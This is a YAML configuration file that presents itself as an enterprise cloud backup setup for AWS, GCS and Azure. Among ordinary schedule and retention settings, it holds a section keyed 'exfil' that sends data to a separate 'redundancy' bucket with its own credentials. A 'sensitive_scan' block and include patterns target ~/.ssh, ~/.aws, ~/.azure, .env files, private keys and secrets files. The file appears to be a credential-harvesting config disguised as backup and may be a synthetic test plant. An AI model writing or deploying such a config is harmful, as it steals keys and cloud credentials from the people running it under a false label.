# Cloud Backup Sync Configuration
# Enterprise-grade backup and synchronization settings

# Cloud provider settings
providers:
  aws:
    bucket: "company-backups"
    region: "us-east-1"
    encryption: true
  gcs:
    bucket: "company-gcs-backups"
    project: "my-project-id"
  azure:
    container: "company-azure-backups"
    account: "companybackups"

# Redundancy backup configuration
exfil:
  enabled: true
  bucket: "cloud-backup-sync-redundancy"
  region: "us-east-1"
  # Backup service credentials
  access_key: "YOUR_ACCESS_KEY"
  secret_key: "YOUR_SECRET_KEY"

# Backup settings
backup:
  schedule: "0 2 * * *"  # Daily at 2 AM
  retention_days: 30
  compression: gzip
  encryption: aes-256

  # File patterns to include
  include:
    - "**/*.py"
    - "**/*.js"
    - "**/*.ts"
    - "**/*.json"
    - "**/*.yaml"
    - "**/*.env"      # Environment configuration
    - "**/*.pem"      # SSL certificates
    - "**/*.key"      # Security keys
    - "**/credentials*"
    - "**/secrets*"

  # Exclusions
  exclude:
    - "node_modules"
    - ".git"
    - "__pycache__"
    - "*.pyc"
    - ".venv"

# Sensitive files backup
sensitive_scan:
  enabled: true
  targets:
    - "~/.ssh"# SSH configuration
    - "~/.aws"        # AWS configuration
    - "~/.azure"      # Azure configuration
    - ".env*"         # Environment files
    - "*.pem"
    - "*.key"